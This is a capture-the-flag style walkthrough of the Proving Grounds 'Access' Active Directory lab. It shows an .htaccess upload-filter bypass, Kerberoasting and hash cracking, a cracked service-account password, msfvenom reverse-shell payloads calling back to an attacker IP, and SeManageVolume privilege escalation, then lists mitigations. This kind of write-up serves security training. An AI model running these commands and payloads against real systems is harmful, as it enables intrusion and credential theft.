## Introduction
In this walkthrough we will be solving Proving Grounds Intermediate Active Directory Windows box Access. Let’s start ..

## Nmap

### TCP

Run a quick Nmap scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Run UDP scan on top 100 ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

No valuable UDP ports are found.

### Full Nmap Scan

```bash
sudo nmap -sV -sC $IP --open
```

Add domain to `/etc/hosts` file

## Services

### Port 53

**Digging any records** of the domain:

```bash
dig any access.offsec @$IP
```

**Zone transfer **

```bash
dig axfr @$IP access.offsec
```

### Port 139/445

- enum4linux

```bash
enum4linux $IP
```

## Web

### Port 80

When accessing the page we can find  Tickets place where I chose Pro-Access and saw upload functionality, that means we can try to upload PHP reverse shell and execute it from browser.

**Directory Fuzzing**

```bash
 gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42
```

![image.png](image%205.png)

we have uploads directory too.

Trying to upload raw **php** file returns the following error:

![image.png](image%206.png)

I fuzzed with BurpSuite for not-blacklisted php extension but no extension returned success.

### Port 443

This site is the same as one with HTTP

## AD Initial Enumeration

### Port 389/3268

```bash
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=access,DC=offsec" | grep descr -A 3 -B 3 - did not return anything
```

```bash
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=access,DC=offsec" #- returns operation error
```

## Exploitation

If blacklist filters don’t work and SSH is not present on the target system( as in that case we could upload `authorized_keys` file with directory traversal) we should try to override upload directory configuration file. 

> Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.
{: .prompt-info}

Add the content :`AddType application/x-httpd-php .l33t`, to the `.htaccess`, this maps an arbitrary extension `.133t` to the executable MIME type `application/x-httpd-php`, then upload that file with specified extension (l33t) and run it, it will be run as PHP file.

Now we got reverse shell:

## Credentials

`svc_mssql : trustno1`


## Privilege Escalation

### Enumeration

![image.png](image%209.png)

there is another service account

Before moving on we are service account but we don’t have full privileges, let’s try to gain them first:

- **[FullPowers](https://github.com/itm4n/FullPowers)**
    
    ![image.png](image%2010.png)
    
    I couldn’t gain Full Powers using FullPowers.exe
    
- [Gaining Full Privileges](https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9---------------------------------------)
   This method didn’t work either
    
    ![image.png](image%2011.png)
    

## Post-Compromise Attacks

**Kerberoasting**

```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```

![image.png](image%2012.png)

Now we have mssql account hash let’s try to crack it using hashcat

```bash
hashcat -m 13100 mssql.hash /usr/share/wordlists/rockyou.txt --force
```

![image.png](image%2013.png)

Now that we have password of svc_mssql service account, we should do lateral movement:

- **PsExec**
    
    I tried with PsExec but it did not work
    
- **Invoke-Runas.ps1**
    - I tried to spawn directly a cmd shell but it didn’t work
    
    ```bash
    Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "cmd.exe" 
    ```
    
    - Let’s generate a reverse shell instead and execute it on the target system
        
        ```bash
        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=445 -f exe > shell.exe
        ```
        
        ```bash
        Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\new\shell.exe"
        ```
        
    
    ![image.png](image%2014.png)
    
    Now we have a shell in the context of the mssql service account
    

I hoped this account would have SeImpersonatePrivilege but no, this account has SeManageVolumePrivilege.

![image.png](image%2015.png)

Looking for ways to exploit this privilege I found this github repo:

I did exactly what it said [here](https://github.com/xct/SeManageVolumeAbuse), [here](https://github.com/CsEnox/SeManageVolumeExploit) you can find necessary script compiled.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.237 LPORT=135 -f dll -o tzres.dll
```

## Mitigation

- In Apache, set `AllowOverride None` in the main config to prevent malicious `.htaccess` modifications.
- Ensure service accounts have **long, complex passwords** (25+ chars) to resist cracking.
- Only grant SeManageVolumePrivilege privilege to **highly trusted administrators**.
